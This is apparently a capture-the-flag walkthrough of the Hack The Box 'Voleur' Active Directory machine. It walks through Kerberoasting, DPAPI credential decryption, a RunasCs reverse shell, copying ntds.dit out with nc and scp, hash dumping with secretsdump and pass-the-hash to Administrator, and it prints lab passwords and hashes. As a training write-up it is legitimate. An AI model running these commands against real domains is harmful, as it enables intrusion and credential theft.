---
title: "Voleur-HTB"
date: 2025-11-02 00:00:00 +0800
categories: [HTB]
tags: [Kerberoasting, WriteSPN, Rusthound, NTLM Disable, DPAPI Attack, SCP, sshkeygen, impacket-secretsdump]
platform: HTB
author: 0xmr
image: /assets/img/posts/voleur-cover.webp
excerpt: "Walkthrough"
---

# Voleur HTB

> Walkthrough for the Voleur machine (Active Directory). This document has been edited  0xmr

## Machine Information

You start the Voleur box with credentials for the following account:

- **Username:** `ryan.naylor`
- **Password:** `HollowOct31Nyt`

---

# Let's Get Started

## Enumeration

### Rustscan / Port discovery

Initial port scan shows common Windows services and an Active Directory environment. Port `389` leaks the domain name `voleur.htb` — this indicates an AD machine. Add the domain to `/etc/hosts` so it resolves to the target IP.

Port `2222` also stands out (SSH).

Example rustscan output (trimmed):

```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-11-02 19:10:43Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
2222/tcp  open  ssh           syn-ack ttl 127 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (protocol 2.0)

<snip>
```

---

## Shares

When attempting SMB access with `NetExec` you may see `STATUS_NOT_SUPPORTED`. This indicates NTLM authentication is disabled on the box — use Kerberos (`-k`) instead.

Example:

```bash
# Wrong (NTLM)
NetExec smb 10.10.11.76 -u 'ryan.naylor' -p 'HollowOct31Nyt'
# Output shows STATUS_NOT_SUPPORTED
```

To generate a Kerberos config and avoid `KRB_AP_ERR_SKEW` (clock skew) errors, create a krb5 file and copy it to `/etc/krb5.conf`:

```bash
NetExec smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --generate-krb5-file krb5.conf
sudo cp krb5.conf /etc/krb5.conf
```

Sync the clock (or use `faketime` if needed):

```bash
ntpdate -u $ip
```

If clock skew persists, use `faketime` around your commands (examples below use `faketime` + `ntpdate -q` to get the DC time):

```bash
faketime "$(ntpdate -q dc.voleur.htb | cut -d ' ' -f 1,2)" NetExec smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k
```

If successful, you should see a positive authentication result.

### Enumerate SMB shares (as `ryan.naylor`)

```bash
faketime "$(ntpdate -q dc.voleur.htb | cut -d ' ' -f 1,2)" NetExec smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --shares
```

Typical share enumeration:

```
ADMIN$
C$
Finance
HR
IPC$ (READ)
IT (READ)
NETLOGON (READ)
SYSVOL (READ)
```

Connect to the `IT` share using `smbclient`:

```bash
smbclient --realm=voleur.htb -U 'voleur.htb/ryan.naylor%HollowOct31Nyt' //dc.voleur.htb/IT
cd "First-Line Support"
dir
get Access_Review.xlsx
```

`Access_Review.xlsx` is password-protected. Extract a hash with `office2john` and crack it with `john`:

```bash
office2john Access_Review.xlsx > file.hash
john file.hash --show
# Example result: Access_Review.xlsx:football1
```

The file revealed credentials (example):

```
todd.wolfe:NightT1meP1dg3on14  # Account was deleted
svc_ldap:M1XyC9pW7qT5Vn
svc_iis:N5pXyW1VqM7CZ8
```

Authenticate with the service accounts (using Kerberos/faketime as needed):

```bash
faketime "$(ntpdate -q dc.voleur.htb | cut -d ' ' -f 1,2)" NetExec smb dc.voleur.htb -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' -k
faketime "$(ntpdate -q dc.voleur.htb | cut -d ' ' -f 1,2)" NetExec smb dc.voleur.htb -u 'svc_iis' -p 'N5pXyW1VqM7CZ8' -k
```

---

## BloodHound / Rusthound (loot collection)

Collect AD data with `rusthound` or `bloodhound-python` to map relationships and attack paths.

```bash
rusthound --domain voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' --zip
# or
bloodhound-python -c All -u ryan.naylor -p 'HollowOct31Nyt' -d voleur.htb -ns $ip
```

---

## Kerberoasting (svc_ldap -> WriteSPN on svc_winrm)

Request SPNs and extract hashes for cracking (Hashcat mode 13100):

```bash
faketime "$(ntpdate -q dc.voleur.htb | cut -d ' ' -f 1,2)" GetUserSPNs.py voleur.htb/svc_ldap:M1XyC9pW7qT5Vn -dc-host dc.voleur.htb -request -k
# or using NetExec
faketime "$(ntpdate -q dc.voleur.htb | cut -d ' ' -f 1,2)" NetExec ldap dc.voleur.htb -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' -k --kerberoasting
```

If you crack an SPN hash for `svc_winrm`, use it to get a shell via `evil-winrm`:

```bash
faketime "$(ntpdate -q dc.voleur.htb | cut -d ' ' -f 1,2)" evil-winrm -i dc.voleur.htb -u 'svc_winrm' -r voleur.htb
```

---

## Stable shell via RunAsCs (using `svc_ldap` credentials)

You can get an interactive shell by using `RunasCs.exe` on a Windows host to run a reverse shell as another user:

```powershell
# on attacker's listener
rlwrap nc -lvnp 443

# on target (example)
.\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell.exe -r $attacker_Ip:443
```

---

## Restoring deleted user `todd.wolfe`

Check for deleted users and restore `todd.wolfe`:

```powershell
Get-ADObject -Filter 'IsDeleted -eq $true' -IncludeDeletedObjects -Properties * | Where-Object {$_.ObjectClass -eq "user"} | Format-List *
# Find ObjectGUID for todd.wolfe, then:
Restore-ADObject -Identity "1c6b1deb-c372-4cbb-87b1-15031de169db"
```

Verify:

```powershell
net users
# todd.wolfe should appear in the user list
```

After restoring, re-run `rusthound` to collect fresh AD data.

---

## Compromise `todd.wolfe`

From `Access_Review.xlsx` we obtained `todd.wolfe`'s password. Use it to authenticate:

```bash
faketime "$(ntpdate -q dc.voleur.htb | cut -d ' ' -f 1,2)" NetExec smb dc.voleur.htb -u 'todd.wolfe' -p 'NightT1meP1dg3on14' -k
```

### DPAPI attack (extracting secrets)

`todd.wolfe` has read access to `Second-Line Support` within the `IT` share. Locate the MasterKey and credential blob files:

- **Master key file** example path:

```
\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110\08949382-134f-4c63-b93c-ce52efc0aa88
```

- **Credential blob** example path:

```
\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials\772275FAD58525253490A9B0039791D3
```

Extract the master key using `dpapi.py` and the user's password + SID:

```bash
dpapi.py masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -password 'NightT1meP1dg3on14' -sid S-1-5-21-3927696377-1337352550-2781715495-1110
# The output contains the decrypted master key
```

Then use that key to decrypt the credential blob:

```bash
dpapi.py credential -file 772275FAD58525253490A9B0039791D3 -key <decrypted_master_key>
```

Example output (redacted):

```
Username: jeremy.combs
Password: qT3V9pLXyN7W4m
Target: Jezzas_Account
```

---

## Using `jeremy.combs` credentials

`jeremy.combs` belongs to `THIRD-LINE SUPPORT`. Connect to the `IT` share and retrieve files:

```bash
smbclient --realm=voleur.htb -U 'voleur.htb/jeremy.combs%qT3V9pLXyN7W4m' //dc.voleur.htb/IT
cd "Third-Line Support"
get id_rsa
get Note.txt.txt
```

`Note.txt.txt` example contents:

> Jeremy,
>
> I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.
>
> Please see what you can set up.
>
> Thanks,
>
> Admin

### Analyze `id_rsa`

Extract the public key and owner with `ssh-keygen`:

```bash
ssh-keygen -y -f ./id_rsa
# Example result: ssh-rsa ... svc_backup@DC
```

SSH into the box (port 2222) using the private key:

```bash
ssh -i id_rsa svc_backup@voleur.htb -p 2222
```

---

## Backup files and NTDS

On `svc_backup` the `/mnt` directory contains backups. List and locate AD files:

```bash
find . -type f
# Example files:
# ./Active Directory/ntds.dit
# ./Active Directory/ntds.jfm
# ./registry/SECURITY
# ./registry/SYSTEM
```

Copy backups to your machine:

```bash
scp -i id_rsa -P 2222 -r "svc_backup@voleur.htb:/mnt/c/IT/Third-Line\\ Support/Backups/" .
```

Or transfer with `nc`:

```bash
# On attacker: listen
nc -lvnp 1337 > ntds.dit
# On target: send
nc -w 3 $attacker_ip 1337 < ntds.dit
```

Dump NTDS with `impacket-secretsdump`:

```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY local
```

Example extracted hashes (redacted):

```
Administrator:500:...:e656e07c56d831611b577b160b259ad2:::
krbtgt:502:...:5aeef2c641148f9173d663be744e323c:::
voleur.htb\svc_backup:1107:...:f44fe33f650443235b2798c72027c573:::
voleur.htb\svc_winrm:1601:...:5d7e37717757433b4780079ee9b1d421:::
```

---

## Root (Administrator) access

Use the `Administrator` NT hash to request a TGT and authenticate with a ticket:

```bash
# Create TGT using saved hash
faketime "$(ntpdate -q voleur.htb | cut -d ' ' -f 1,2)" getTGT.py -dc-ip 10.10.11.76 'voleur.htb/Administrator' -hashes :e656e07c56d831e...
# Saves ticket Administrator.ccache

# Authenticate with evil-winrm using the ticket
faketime "$(ntpdate -q dc.voleur.htb | cut -d ' ' -f 1,2)" evil-winrm -i dc.voleur.htb -u 'Administrator' -r voleur.htb
```

Once authenticated as `Administrator`, capture the root flag.

---

*Document edited by: 0xmr*
